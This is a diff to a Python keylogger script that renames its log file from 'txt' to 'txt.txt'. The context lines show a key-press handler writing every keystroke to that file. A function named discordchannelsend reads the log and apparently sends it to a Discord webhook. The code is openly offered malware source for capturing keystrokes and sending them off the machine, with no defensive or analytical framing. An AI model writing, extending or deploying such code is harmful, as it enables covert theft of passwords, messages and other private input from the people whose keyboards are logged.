@@ -11,7 +11,7 @@ url = 'The webhook'
 
 
 def on_press(key):
-    with open('txt', 'a') as f: # IMPORTANT: You NEED to create a text file for this, or else it will not work. Replace the 'txt' in every open function with the name of your text file.
+    with open('txt.txt', 'a') as f: # IMPORTANT: if the logged keys do not get appended to the file, then create your own txt file and replace every 'txt.txt' with the name of your file
         k = str(key).replace("'", "")
         print(f'{key}')
         if k.find('space') > 0:
@@ -29,7 +29,7 @@ def on_press(key):
 
 
 def file_linereplace(line_replace):
-    with open('txt', 'r') as u:
+    with open('txt.txt', 'r') as u:
         f = u.readlines()
         if 1 <= line_replace <= len(f):
             del f[line_replace - 1]
@@ -41,7 +41,7 @@ def file_linereplace(line_replace):
 
 
 def discordchannelsend():
-    with open('txt', 'r') as lines:
+    with open('txt.txt', 'r') as lines:
         formatting = lines.readlines()
         NoDotsOrSquareBrackets = ''.join(formatting)
 
@@ -61,7 +61,7 @@ def discordchannelsend():
 
 
 def main():
-    with open('txt', 'r') as file:
+    with open('txt.txt', 'r') as file:
         content = file.read()
         print(content)
 
